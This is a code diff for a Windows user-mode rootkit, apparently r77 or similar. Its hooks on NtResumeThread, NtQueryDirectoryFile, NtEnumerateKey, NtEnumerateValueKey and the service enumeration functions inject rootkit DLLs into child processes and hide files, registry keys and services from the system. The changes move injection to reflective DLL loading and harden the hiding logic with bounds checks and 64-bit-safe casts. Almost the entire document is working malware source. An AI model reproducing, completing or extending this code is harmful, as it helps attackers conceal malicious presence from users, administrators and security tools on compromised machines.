@@ -274,6 +274,7 @@ static NTSTATUS NTAPI HookedNtResumeThread(HANDLE thread, PULONG suspendCount)
 					{
 						// WriteFile got stuck.
 						TerminateThread(thread, 0);
+						CloseHandle(thread);
 					}
 				}
 			}
@@ -281,8 +282,8 @@ static NTSTATUS NTAPI HookedNtResumeThread(HANDLE thread, PULONG suspendCount)
 		else
 		{
 			// Inject the process directly.
-			InjectDll(processId, RootkitDll32, RootkitDll32Size);
-			InjectDll(processId, RootkitDll64, RootkitDll64Size);
+			InjectDllReflective(processId, RootkitDll32, RootkitDll32Size, 100);
+			InjectDllReflective(processId, RootkitDll64, RootkitDll64Size, 100);
 		}
 	}
 
@@ -306,7 +307,7 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFile(HANDLE fileHandle, HANDLE event
 		if (returnSingleEntry)
 		{
 			// When returning a single entry, skip until the first item is found that is not hidden.
-			for (BOOL skip = HasPrefix(FileInformationGetName(fileInformation, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(fileInformation, fileInformationClass, fileFileName))); skip; skip = HasPrefix(FileInformationGetName(fileInformation, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(fileInformation, fileInformationClass, fileFileName))))
+			for (BOOL skip = HasPrefix(FileInformationGetName(fileInformation, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(fileInformation, fileInformationClass, fileFileName), MAX_PATH)); skip; skip = HasPrefix(FileInformationGetName(fileInformation, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(fileInformation, fileInformationClass, fileFileName), MAX_PATH)))
 			{
 				status = OriginalNtQueryDirectoryFile(fileHandle, event, apcRoutine, apcContext, ioStatusBlock, fileInformation, length, fileInformationClass, returnSingleEntry, fileName, restartScan);
 				if (status) break;
@@ -322,7 +323,7 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFile(HANDLE fileHandle, HANDLE event
 			{
 				nextEntryOffset = FileInformationGetNextEntryOffset(current, fileInformationClass);
 
-				if (HasPrefix(FileInformationGetName(current, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(current, fileInformationClass, fileFileName))))
+				if (HasPrefix(FileInformationGetName(current, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(current, fileInformationClass, fileFileName), MAX_PATH)))
 				{
 					if (nextEntryOffset)
 					{
@@ -368,7 +369,7 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(HANDLE fileHandle, HANDLE eve
 		if (queryFlags & SL_RETURN_SINGLE_ENTRY)
 		{
 			// When returning a single entry, skip until the first item is found that is not hidden.
-			for (BOOL skip = HasPrefix(FileInformationGetName(fileInformation, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(fileInformation, fileInformationClass, fileFileName))); skip; skip = HasPrefix(FileInformationGetName(fileInformation, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(fileInformation, fileInformationClass, fileFileName))))
+			for (BOOL skip = HasPrefix(FileInformationGetName(fileInformation, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(fileInformation, fileInformationClass, fileFileName), MAX_PATH)); skip; skip = HasPrefix(FileInformationGetName(fileInformation, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(fileInformation, fileInformationClass, fileFileName), MAX_PATH)))
 			{
 				status = OriginalNtQueryDirectoryFileEx(fileHandle, event, apcRoutine, apcContext, ioStatusBlock, fileInformation, length, fileInformationClass, queryFlags, fileName);
 				if (status) break;
@@ -384,7 +385,7 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(HANDLE fileHandle, HANDLE eve
 			{
 				nextEntryOffset = FileInformationGetNextEntryOffset(current, fileInformationClass);
 
-				if (HasPrefix(FileInformationGetName(current, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(current, fileInformationClass, fileFileName))))
+				if (HasPrefix(FileInformationGetName(current, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(current, fileInformationClass, fileFileName), MAX_PATH)))
 				{
 					if (nextEntryOffset)
 					{
@@ -465,9 +466,9 @@ static NTSTATUS NTAPI HookedNtEnumerateKey(HANDLE key, ULONG index, NT_KEY_INFOR
 	}
 
 	HANDLE cacheKey = (HANDLE)TlsGetValue(TlsNtEnumerateKeyCacheKey);
-	ULONG cacheIndex = (ULONG)TlsGetValue(TlsNtEnumerateKeyCacheIndex);
-	ULONG cacheI = (ULONG)TlsGetValue(TlsNtEnumerateKeyCacheI);
-	ULONG cacheCorrectedIndex = (ULONG)TlsGetValue(TlsNtEnumerateKeyCacheCorrectedIndex);
+	ULONG cacheIndex = (ULONG)(UINT_PTR)TlsGetValue(TlsNtEnumerateKeyCacheIndex);
+	ULONG cacheI = (ULONG)(UINT_PTR)TlsGetValue(TlsNtEnumerateKeyCacheI);
+	ULONG cacheCorrectedIndex = (ULONG)(UINT_PTR)TlsGetValue(TlsNtEnumerateKeyCacheCorrectedIndex);
 
 	ULONG i = 0;
 	ULONG correctedIndex = 0;
@@ -540,19 +541,19 @@ static NTSTATUS NTAPI HookedNtEnumerateKey(HANDLE key, ULONG index, NT_KEY_INFOR
 
 	correctedIndex--;
 
-	TlsSetValue(TlsNtEnumerateKeyCacheKey, key);
-	TlsSetValue(TlsNtEnumerateKeyCacheIndex, index);
-	TlsSetValue(TlsNtEnumerateKeyCacheI, i);
-	TlsSetValue(TlsNtEnumerateKeyCacheCorrectedIndex, correctedIndex);
+	TlsSetValue(TlsNtEnumerateKeyCacheKey, (LPVOID)key);
+	TlsSetValue(TlsNtEnumerateKeyCacheIndex, (LPVOID)(UINT_PTR)index);
+	TlsSetValue(TlsNtEnumerateKeyCacheI, (LPVOID)(UINT_PTR)i);
+	TlsSetValue(TlsNtEnumerateKeyCacheCorrectedIndex, (LPVOID)(UINT_PTR)correctedIndex);
 
 	return OriginalNtEnumerateKey(key, correctedIndex, keyInformationClass, keyInformation, keyInformationLength, resultLength);
 }
 static NTSTATUS NTAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_VALUE_INFORMATION_CLASS keyValueInformationClass, LPVOID keyValueInformation, ULONG keyValueInformationLength, PULONG resultLength)
 {
 	HANDLE cacheKey = (HANDLE)TlsGetValue(TlsNtEnumerateValueKeyCacheKey);
-	ULONG cacheIndex = (ULONG)TlsGetValue(TlsNtEnumerateValueKeyCacheIndex);
-	ULONG cacheI = (ULONG)TlsGetValue(TlsNtEnumerateValueKeyCacheI);
-	ULONG cacheCorrectedIndex = (ULONG)TlsGetValue(TlsNtEnumerateValueKeyCacheCorrectedIndex);
+	ULONG cacheIndex = (ULONG)(UINT_PTR)TlsGetValue(TlsNtEnumerateValueKeyCacheIndex);
+	ULONG cacheI = (ULONG)(UINT_PTR)TlsGetValue(TlsNtEnumerateValueKeyCacheI);
+	ULONG cacheCorrectedIndex = (ULONG)(UINT_PTR)TlsGetValue(TlsNtEnumerateValueKeyCacheCorrectedIndex);
 
 	ULONG i = 0;
 	ULONG correctedIndex = 0;
@@ -607,10 +608,10 @@ static NTSTATUS NTAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_
 
 	correctedIndex--;
 
-	TlsSetValue(TlsNtEnumerateValueKeyCacheKey, key);
-	TlsSetValue(TlsNtEnumerateValueKeyCacheIndex, index);
-	TlsSetValue(TlsNtEnumerateValueKeyCacheI, i);
-	TlsSetValue(TlsNtEnumerateValueKeyCacheCorrectedIndex, correctedIndex);
+	TlsSetValue(TlsNtEnumerateValueKeyCacheKey, (LPVOID)key);
+	TlsSetValue(TlsNtEnumerateValueKeyCacheIndex, (LPVOID)(UINT_PTR)index);
+	TlsSetValue(TlsNtEnumerateValueKeyCacheI, (LPVOID)(UINT_PTR)i);
+	TlsSetValue(TlsNtEnumerateValueKeyCacheCorrectedIndex, (LPVOID)(UINT_PTR)correctedIndex);
 
 	return OriginalNtEnumerateValueKey(key, correctedIndex, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);
 }
@@ -923,6 +924,8 @@ static DWORD WINAPI WriteChildProcessPipeThread(LPVOID parameter)
 	ReadFile(pipe, &returnValue, sizeof(BYTE), &bytesRead, NULL);
 
 	CloseHandle(pipe);
+
+	return 0;
 }
 static BOOL GetProcessHiddenTimes(PLARGE_INTEGER hiddenKernelTime, PLARGE_INTEGER hiddenUserTime, PLONGLONG hiddenCycleTime)
 {
@@ -960,18 +963,19 @@ static BOOL GetProcessHiddenTimes(PLARGE_INTEGER hiddenKernelTime, PLARGE_INTEGE
 	FREE(systemInformation);
 	return result;
 }
-static LPWSTR CreatePath(LPWSTR result, LPCWSTR directoryName, LPCWSTR fileName)
+static LPWSTR CreatePath(LPWSTR result, LPCWSTR directoryName, LPCWSTR fileName, DWORD resultLength)
 {
 	// PathCombineW cannot be used with the directory name "\\.\pipe\".
-	if (!StrCmpIW(directoryName, L"\\\\.\\pipe\\"))
+	if (!StrCmpNIW(directoryName, L"\\\\.\\pipe\\", resultLength))
 	{
-		StrCpyW(result, directoryName);
-		StrCatW(result, fileName);
+		StrCpyNW(result, directoryName, resultLength);
+		StrNCatW(result, fileName, resultLength);
 		return result;
 	}
-	else
+	else if (lstrlenW(directoryName) + lstrlenW(fileName) + 1 < resultLength)
 	{
-		return PathCombineW(result, directoryName, fileName);
+		PathCombineW(result, directoryName, fileName);
+		return result;
 	}
 }
 static LPWSTR FileInformationGetName(LPVOID fileInformation, FILE_INFORMATION_CLASS fileInformationClass, LPWSTR name)
@@ -1066,8 +1070,8 @@ static VOID FilterEnumServiceStatusA(LPENUM_SERVICE_STATUSA services, LPDWORD se
 {
 	for (DWORD i = 0; i < *servicesReturned; i++)
 	{
-		LPCWSTR serviceNameW = ConvertAStringToString(services[i].lpServiceName);
-		LPCWSTR displayNameW = ConvertAStringToString(services[i].lpDisplayName);
+		LPWSTR serviceNameW = ConvertAStringToString(services[i].lpServiceName);
+		LPWSTR displayNameW = ConvertAStringToString(services[i].lpDisplayName);
 
 		// If hidden, move all following entries up by one and decrease count.
 		if (HasPrefix(serviceNameW) ||
@@ -1106,8 +1110,8 @@ static VOID FilterEnumServiceStatusProcessA(LPENUM_SERVICE_STATUS_PROCESSA servi
 {
 	for (DWORD i = 0; i < *servicesReturned; i++)
 	{
-		LPCWSTR serviceNameW = ConvertAStringToString(services[i].lpServiceName);
-		LPCWSTR displayNameW = ConvertAStringToString(services[i].lpDisplayName);
+		LPWSTR serviceNameW = ConvertAStringToString(services[i].lpServiceName);
+		LPWSTR displayNameW = ConvertAStringToString(services[i].lpDisplayName);
 
 		// If hidden, move all following entries up by one and decrease count.
 		if (HasPrefix(serviceNameW) ||
@@ -1185,7 +1189,7 @@ static DWORD GetProcessIdFromPdhString(LPCWSTR str)
 		{
 			WCHAR pidString[10];
 
-			DWORD strLength = endIndex - str;
+			DWORD strLength = (DWORD)(endIndex - str);
 			i_wmemcpy(pidString, str, strLength);
 			pidString[strLength] = L'\0';
 
